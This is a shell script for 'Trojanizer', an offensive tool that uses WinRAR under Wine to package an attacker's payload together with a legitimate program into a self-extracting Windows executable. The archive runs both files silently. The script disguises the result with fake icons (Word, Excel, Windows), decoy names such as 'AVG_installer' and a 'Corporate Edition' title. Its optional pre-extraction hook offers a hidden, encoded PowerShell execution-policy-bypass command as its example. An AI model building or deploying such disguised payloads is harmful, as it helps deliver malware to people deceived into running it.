#!/bin/sh
##
# Trojanizer | Version: v1.0 (Stable)
# Author: pedro ubuntu [ r00t-3xp10it ]
# Distros Supported : Ubuntu, Kali, Parrot
# Suspicious-Shell-Activity (SSA) RedTeam develop @2017
#
# Description:
#    The Trojanizer tool uses WinRAR (SFX) to compress two files inserted by user,
#    and transforms it into an SFX executable(.exe) archive. The sfx archive when
#    executed it will run both files (our payload and the legit appl at the same time).
#
#    To make the archive less suspicious at execution time, trojanizer will replace
#    the default icon (.ico) of the sfx file with a user-selected one, it also allows
#    to execute a program/command before the extraction/execution of the two files.
#    To activate the Presetup funtion: [ settings -> PRE_SETUP=ON ]
#
#   'This tool will not build real trojans, but from target perpective it behaves like one' ..
#   (hidde the payload execution while the legit application also executes).
##
# resize terminal window [ milton@barra ] ..
resize -s 22 111 > /dev/null



#
# Colorise shell Script output leters
#
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}



#
# Framework variable declarations
#
VeR="1.0" # Framework version
IPATH=`pwd` # store Framework full path
HoME=`echo ~` # store home variable
CnA="Troia_Revisited" # Framework codename display
#
# Read options (configurations) from settings file ..
#
WINE_C=`cat $IPATH/settings | egrep -m 1 "WINE_PATH" | cut -d '=' -f2` > /dev/null 2>&1 # store wine full path
WINRAR_PATH=`cat $IPATH/settings | egrep -m 1 "WINRAR_PATH" | cut -d '=' -f2` > /dev/null 2>&1 # store winrar.exe full wine path
ArCh=`cat $IPATH/settings | egrep -m 1 "SYSTEM_ARCH" | cut -d '=' -f2` > /dev/null 2>&1 # sellected arch to use in Trojanizer.sh
LoGo=`cat $IPATH/settings | egrep -m 1 "USE_LOGO" | cut -d '=' -f2` > /dev/null 2>&1 # EXTRA: replace SFX logo (image.bmp) ?
PRES=`cat $IPATH/settings | egrep -m 1 "PRE_SETUP" | cut -d '=' -f2` > /dev/null 2>&1 # EXTRA: use presetup to exec befor extract ?
#
# Config user system correct arch
# Command syntax to be used based on arch sellected ..
#
if [ "$ArCh" = "x86" ]; then
  dEd="x86"
  arch="wine"
  PgFi="Program Files"
else
  dEd="x64"
  arch="wine64"
  PgFi="Program Files (x86)"
fi



#
# pass arguments to script [ -h | -v ]
# we can use: ./Trojanizer.sh -h for help menu
# we can use: ./Trojanizer.sh -v for version display
#
while getopts ":h,:v," opt; do
  case $opt in
    h)
cat << !
---
-- Author: r00t-3xp10it | SSA RedTeam @2017
-- TROJANIZE YOUR PAYLOAD INTO ONE SFX AUTO-EXEC
-- Supported: Kali, Ubuntu, Parrot
---

    The Trojanizer tool uses WinRAR (SFX) to compress two files inserted by user,
    and transforms it into an SFX executable(.exe) archive. The sfx archive when
    executed it will run both files (our payload and the legit appl at the same time).

    To make the archive less suspicious at execution time, trojanizer will replace
    the default icon (.ico) of the sfx file with a user-selected one, it also allows
    to execute a program/command before the extraction/execution of the two files.
    To activate the Presetup funtion: [ settings -> PRE_SETUP=ON ]

   'This tool will not build real trojans, but from target perpective it behaves like one' ..
   (hidde the payload execution while the legit application also executes).


   -- FIRST TIME RUN
   1 - nano settings
   2 - sudo chmod +x Trojanizer.sh
   3 - sudo ./Trojanizer.sh

!
   exit
    ;;
    v)
cat << !
---
-- Author: r00t-3xp10it | SSA RedTeam @2017
-- TROJANIZE YOUR PAYLOAD INTO ONE SFX AUTO-EXEC
-- Supported: Kali, Ubuntu, Parrot
---

   Trojanizer Version: $VeR
   Arch selected     : $ArCh
   Codename          : $CnA
!
   exit
    ;;
    \?)
      echo ${RedF}[x]${white} Invalid option:${RedF} -$OPTARG ${Reset}; >&2
      exit
    ;;
  esac
done



#
# Check for dependencies Installed ..
# zenity, wine, winrar(wine)
#
Colors;
echo ${YellowF}['!']${white} Checking backend applications ..${Reset};
sleep 1
#
# search for wine intallation ..
#
apc=`which $arch`
if [ "$?" != "0" ]; then
  FaIl="YES"
  echo ${RedF}[x]${white} $arch installation '->' not found!${Reset};
  sleep 1
  echo ${RedF}[x]${white} This script requires $arch to work${Reset};
  echo ${YellowF}['!'] Please wait: installing missing dependencies ..${Reset};
  echo ""
  sudo apt-get install $arch
  echo ""
else
  echo ${BlueF}[☆]${white}" $arch installation   : ${GreenF}found!"${Reset};
  sleep 1
fi
#
# search for wine (drive_c) intallation ..
#
if [ -e "$WINE_C" ]; then
  echo ${BlueF}[☆]${white}" $arch Program Files  : ${GreenF}found!"${Reset};
  sleep 1
else
  FaIl="YES"
  echo ${RedF}[x]${white} $arch Program Files '->' not found!${Reset};
  sleep 1
  echo ${YellowF}['!'] Please wait: installing missing dependencies ..${Reset};
  echo ""
  winecfg > /dev/null 2>&1
  echo ""
fi
#
# search for: 'winrar.exe' executable ..
#
if [ -e "$WINRAR_PATH" ]; then
  echo ${BlueF}[☆]${white}" WinRAR software       : ${GreenF}found!"${Reset};
  sleep 1
else
  FaIl="YES"
  echo ${RedF}[x]${white} $WINRAR_PATH '->' not found!${Reset};
  sleep 2
  echo ${GreenF}[☆]${white} Please wait, trying to build required folders ..!${Reset};

    if [ "$arch" = "x86" ]; then
      cd backend
      $arch install_winrar_wine32.exe
      cd $IPATH
    else
      cd backend
      $arch install_winrar_wine64.exe
      cd $IPATH
    fi
fi
#
# search for zenity intallation ..
#
apc=`which zenity`
if [ "$?" != "0" ]; then
  FaIl="YES"
  echo ${RedF}[x]${white} Zenity installation '->' not found!${Reset};
  sleep 1
  echo ${RedF}[x]${white} This script requires Zenity to work!${Reset};
  echo ${YellowF}['!'] Please wait: installing missing dependencies ..${Reset};
  echo ""
  sudo apt-get install zenity
  echo ""
else
  echo ${BlueF}[☆]${white}" Zenity installation   : ${GreenF}found!"${Reset};
  sleep 1
fi
#
# Restart tool after dependencies installs (FaIl="YES")
#
if [ "$FaIl" = "YES" ]; then
  sleep 3
  echo ${RedF}[x] Trojanizer needs to restart to finish installs ..${Reset};
  echo ${RedF}[x] Please execute the tool again ..${Reset};
  sleep 2
  exit
fi
sleep 1
echo ${GreenF}[☆]${white} Please wait, Loading tool ..${Reset};
sleep 2





#
# BANNER DISPLAY (run or abort)
# HINT: This will give users the chance to abort tool execution ..
#
echo ${BlueF}
clear
cat << !

    ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██╗███████╗███████╗██████╗ 
    ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██║╚══███╔╝██╔════╝██╔══██╗
       ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██║  ███╔╝ █████╗  ██████╔╝
       ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██║ ███╔╝  ██╔══╝  ██╔══██╗
       ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║███████╗███████╗██║  ██║
       ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
!
echo ${YellowF}"                  'Trojan(nize) your payload (Winrar SFX automatization)'"${Reset};
echo "" && echo ""
#
# Chose to run or to abort framework execution ..
#
rUn=$(zenity --question --title="☠ Trojanizer ☠" --text "Execute framework?" --width 270) > /dev/null 2>&1
  if [ "$?" -eq "0" ]; then
    #
    # Clean all things up, befor continue ..
    #
    rm -r $IPATH/output > /dev/null 2>&1
    mkdir $IPATH/output > /dev/null 2>&1
    echo ${BlueF}[☆]${white}" Rebuild output folder : ${GreenF}done!"${Reset};
    sleep 2



#
# Store user inputs (into local variables)..
#
binary_path=$(zenity --title "☠ PAYLOAD TO BE COMPRESSED ☠" --filename=$IPATH --file-selection --text "chose payload to be COMPRESSED") > /dev/null 2>&1
   #
   # grab only the executable name from the full path
   # ^/ (search for expression) +$ (print only last espression)
   #
   cd $IPATH/output
   echo "$binary_path" > rep.log
   Str=`grep -oE '[^/]+$' rep.log` > /dev/null 2>&1
   Ext=`echo $Str | cut -d '.' -f2` > /dev/null 2>&1
   rm rep.log > /dev/null 2>&1
     #
     # Check if agent (payload) inputed its compatible with trojanizer tool
     #
     if [ "$Ext" = "exe" ] || [ "$Ext" = "bat" ] || [ "$Ext" = "vbs" ] || [ "$Ext" = "ps1" ]; then
       echo "nothing" > /dev/null 2>&1
     else
       echo ${RedF}[x]${white} Payload inputed not compatible:${RedF} .$Ext ${Reset};
       echo ${RedF}[x] Abort${white} framework execution .. ${Reset};
       sleep 2
       exit
     fi


legit_path=$(zenity --title "☠ LEGIT APPLICATION TO TROJANIZE ☠" --filename=$IPATH --file-selection --text "chose legit application/agent") > /dev/null 2>&1
N4m3=$(zenity --title="☠ Input SFX FILENAME ☠" --text "example: AVG_installer" --entry --width 300) > /dev/null 2>&1
IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "Windows-black.ico" FALSE "Windows-Metro.ico" FALSE "Microsoft-Excel.ico" FALSE "Microsoft-Word.ico" FALSE "Windows-Logo.ico" FALSE "Windows-Store.ico" FALSE "Input your own icon" --width 330 --height 330) > /dev/null 2>&1
# Input your own icon.ico ?
if [ "$IcOn" = "Input your own icon" ]; then
  Icon_path=$(zenity --title "☠ INPUT YOUR OWN ICON (.ico) FILE ☠" --filename=$IPATH/bin --file-selection --text "chose the icon.ico to use ..") > /dev/null 2>&1
fi
# Input your own logo.bmp image ?
if [ "$LoGo" = "ON" ]; then
  logo_path=$(zenity --title "☠ INPUT YOUR OWN LOGO (.bmp) IMAGE ☠" --filename=$IPATH --file-selection --text "chose the image.bmp to use ..") > /dev/null 2>&1
fi
#
# Presetup = program/command to exec before archive extractions ..
#
if [ "$PRES" = "ON" ]; then
  MyPr=$(zenity --title="☠ PRESETUP FUNTION ☠" --text "Presetup sfx funtion to exec program/command before extraction\nexample: powershell.exe -nop -wind hidden -Exec Bypass -noni -enc TfD3DvcHtLhiSmoT==" --entry --width 300) > /dev/null 2>&1
  echo ${YellowF}['!']${white}" Using WinRAR SFX Presetup= switch .."${Reset};
  sleep 2
fi



#
# CONFIG WINE PATH FOR ICON REPLACEMENT
# linux path uses forward slashs in path names and WINE uses blackslashs
# so we need to convert the variable $IPATH to use the backslashs insted ..
# 
echo "$IPATH" > $IPATH/output/rep.log
sed -i 's|/|\\|g' $IPATH/output/rep.log
BPATH=`cat $IPATH/output/rep.log`
echo ${BlueF}[☆]${white}" Config WINE path for icon replacement : ${GreenF}done!"${Reset};
rm $IPATH/output/rep.log
sleep 2



#
# copy files nedded to output folder ..
# and store is names into local variables for later use ..
#
cp $binary_path $IPATH/output > /dev/null 2>&1
ST_O=`ls | egrep -m 1 '.'` > /dev/null 2>&1
rm $IPATH/output/$ST_O > /dev/null 2>&1
cp $legit_path $IPATH/output > /dev/null 2>&1
ST_D=`ls | egrep -m 1 '.'` > /dev/null 2>&1
cp $binary_path $IPATH/output > /dev/null 2>&1
echo ${BlueF}[☆]${white}" Copy all files to output folder : ${GreenF}done!"${Reset};
sleep 2



#
# build SFX configuration file (bin/xsf.conf)
#
echo "; The sfx archive title" > $IPATH/bin/xsf.conf
echo "Title=$N4m3 Corporate Edition" >> $IPATH/bin/xsf.conf
  #
  # use Presetup program/command to exec before extraction ..
  #
  if [ "$PRES" = "ON" ]; then
    echo "; Presetup program/command to execute before extraction" >> $IPATH/bin/xsf.conf
    echo "Presetup=$MyPr" >> $IPATH/bin/xsf.conf
  fi
echo "; The path to the setup executables" >> $IPATH/bin/xsf.conf
echo "Setup=$ST_O" >> $IPATH/bin/xsf.conf
echo "Setup=$ST_D" >> $IPATH/bin/xsf.conf
echo "; Use semi-silent mode" >> $IPATH/bin/xsf.conf
echo "Silent=1" >> $IPATH/bin/xsf.conf
echo "; Overwrite any existing files" >> $IPATH/bin/xsf.conf
echo "Overwrite=1" >> $IPATH/bin/xsf.conf
echo ${BlueF}[☆]${white}" Build SFX configuration file : ${GreenF}done!"${Reset};
sleep 2



#
# Use WinRAR.exe inside WINE to compress the two files ..
#
echo ${BlueF}[☆]${white}" Use WINRAR to compress files : ${YellowF}working .."${Reset};
sleep 2
  #
  # User have decided to use is own icon ..
  #
  if [ "$IcOn" = "Input your own icon" ]; then
    # strip forward slashs from path (unix), and replace them by backslashs (windows-wine)
    echo "$Icon_path" > $IPATH/output/rep.log
    sed -i 's|/|\\|g' $IPATH/output/rep.log
    BPATH=`cat $IPATH/output/rep.log`
    rm $IPATH/output/rep.log > /dev/null 2>&1

      if [ "$LoGo" = "ON" ]; then
        # strip forward slashs from path (unix), and replace them by backslashs (windows-wine)
        echo ${YellowF}['!']${white}" Replacing SFX archive logo (image.bmp).."${Reset};
        echo "$logo_path" > $IPATH/output/rep.log
        sed -i 's|/|\\|g' $IPATH/output/rep.log
        LPATH=`cat $IPATH/output/rep.log`
        rm $IPATH/output/rep.log > /dev/null 2>&1
        echo ""
        #
        # Wine + Winrar onelinner bash command ..
        #
        $arch "$WINRAR_PATH" a -c -z$IPATH/bin/xsf.conf -iiconZ:$BPATH -iimageZ:$LPATH -r- -ed -s -sfx -y $N4m3
        echo ""
      else
        echo ""
        #
        # Wine + Winrar onelinner bash command ..
        #
        $arch "$WINRAR_PATH" a -c -z$IPATH/bin/xsf.conf -iiconZ:$BPATH -r- -ed -s -sfx -y $N4m3
        echo ""
      fi


  else


      #
      # User have decided to use Trojanizer icons ..
      # User have decided to use is own sfx logo ..
      #
      if [ "$LoGo" = "ON" ]; then
        # strip forward slashs from path (unix), and replace them by backslashs (windows-wine)
        echo ${YellowF}['!']${white}" Replacing SFX archive logo (image.bmp).."${Reset};
        echo "$logo_path" > $IPATH/output/rep.log
        sed -i 's|/|\\|g' $IPATH/output/rep.log
        LPATH=`cat $IPATH/output/rep.log`
        rm $IPATH/output/rep.log > /dev/null 2>&1
        echo ""
        #
        # Wine + Winrar onelinner bash command ..
        #
        $arch "$WINRAR_PATH" a -c -z$IPATH/bin/xsf.conf -iiconZ:$BPATH\\bin\\$IcOn -iimageZ:$LPATH -r- -ed -s -sfx -y $N4m3
        echo ""
      else
        echo ""
        #
        # Wine + Winrar onelinner bash command ..
        #
        $arch "$WINRAR_PATH" a -c -z$IPATH/bin/xsf.conf -iiconZ:$BPATH\\bin\\$IcOn -r- -ed -s -sfx -y $N4m3
        echo ""
      fi

  fi


#
# clean old binarys from output folder ..
#
rm $IPATH/output/$ST_O > /dev/null 2>&1
rm $IPATH/output/$ST_D > /dev/null 2>&1
zenity --info --title="☠ Trojanizer ☠" --text "Your sfx archive:\n'$IPATH/output/$N4m3.exe'" --width 380 > /dev/null 2>&1
#
# Display final settings to user
#
echo ${BlueF}[☆]${white}" PAYLOAD      : ${BlueF} $ST_O"${Reset};
echo ${BlueF}[☆]${white}" LEGIT APPL   : ${BlueF} $ST_D"${Reset};
echo ${BlueF}[☆]${white}" SFX FILE     : ${BlueF} $N4m3.exe"${Reset};
echo ${BlueF}[☆]${white}" SFX STORAGE  : ${BlueF} $IPATH/output/$N4m3.exe"${Reset};
echo ""
sleep 2
cd $IPATH


else



    #
    # Exit framework (abort funtion) ..
    #
    echo ""
    echo ${white} Author${RedF}::${white}pedr0 ubuntu${RedF}::${white}[r00t-3xp10it]${Reset};
    echo ${white} Trojanizer${RedF}::${white}v$VeR${RedF}::${white}SuspiciousShellActivity©${RedF}::${white}RedTeam${RedF}::${white}2017${Reset};
    sleep 1
exit
fi

